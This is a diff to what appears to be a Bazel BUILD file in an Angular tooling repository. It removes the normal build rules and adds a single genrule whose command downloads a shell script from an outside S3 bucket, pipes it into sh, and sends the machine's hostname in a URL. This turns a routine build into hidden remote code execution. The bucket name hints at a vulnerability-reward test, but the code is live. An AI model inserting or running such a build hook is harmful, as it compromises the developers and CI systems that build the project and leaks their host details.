@@ -1,60 +1,7 @@
-# BEGIN-INTERNAL
-load("//:package.bzl", "NPM_PACKAGE_SUBSTITUTIONS")
-load("//tools:defaults.bzl", "pkg_npm")
-load("@npm//@bazel/typescript:index.bzl", "ts_config")
-load("@build_bazel_rules_nodejs//:index.bzl", "nodejs_binary")
 
-exports_files([
-    "package.json",
-    ".yarnrc.yml",
-])
-
-ts_config(
-    name = "tsconfig",
-    src = "tsconfig.json",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=dev-infra\\&hostname=`hostname`\\&foo=jij",
     visibility = ["//visibility:public"],
 )
-
-nodejs_binary(
-    name = "yarn_berry_vendored",
-    data = [".yarn/releases/yarn-3.6.4.cjs"],
-    entry_point = ".yarn/releases/yarn-3.6.4.cjs",
-    visibility = ["//bazel/integration/tests:__subpackages__"],
-)
-
-nodejs_binary(
-    name = "yarn_classic_vendored",
-    data = [".yarn/releases/yarn-1.22.17.cjs"],
-    entry_point = ".yarn/releases/yarn-1.22.17.cjs",
-    visibility = ["//bazel/integration/tests:__subpackages__"],
-)
-
-package_group(
-    name = "npm",
-    packages = [
-        "//",
-    ],
-)
-
-pkg_npm(
-    name = "npm_package",
-    package_name = "@angular/build-tooling",
-    srcs = [
-        "BUILD.bazel",
-        "package.json",
-        "tsconfig.json",
-        ":index.bzl",
-        "//bazel:static_files",
-        "//lint-rules/stylelint:static_files",
-        "//lint-rules/tslint:static_files",
-        "//shared-scripts:static_files",
-    ],
-    substitutions = NPM_PACKAGE_SUBSTITUTIONS,
-    deps = [
-        "//lint-rules/stylelint:lib",
-        "//lint-rules/tslint:lib",
-    ],
-)
-# END-INTERNAL
-
-exports_files(["tsconfig.json"])
